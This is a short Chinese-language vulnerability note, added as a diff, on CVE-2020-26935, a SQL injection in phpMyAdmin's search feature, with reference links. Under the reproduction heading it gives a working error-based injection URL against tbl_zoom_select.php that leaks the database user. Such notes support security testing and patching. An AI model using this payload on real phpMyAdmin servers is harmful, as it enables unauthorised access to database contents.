@@ -1,0 +1,19 @@
+# phpMyAdmin后台SQL注入 CVE-2020-26935
+
+## 漏洞描述
+
+在4.9.6之前的phpMyAdmin和5.0.3之前的5.x的SearchController中发现一个问题。在phpMyAdmin如何处理搜索功能中的SQL语句中发现了一个SQL注入漏洞。攻击者可以利用此漏洞将恶意SQL注入查询。
+
+参考链接：
+
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26935
+- https://xz.aliyun.com/t/8524
+
+## 漏洞复现
+
+payload：
+
+```
+http://127.0.0.1/tbl_zoom_select.php?db=pentest&table=a&get_data_row=1&where_clause=updatexml(1,concat(0x7e,user()),1)
+```
+
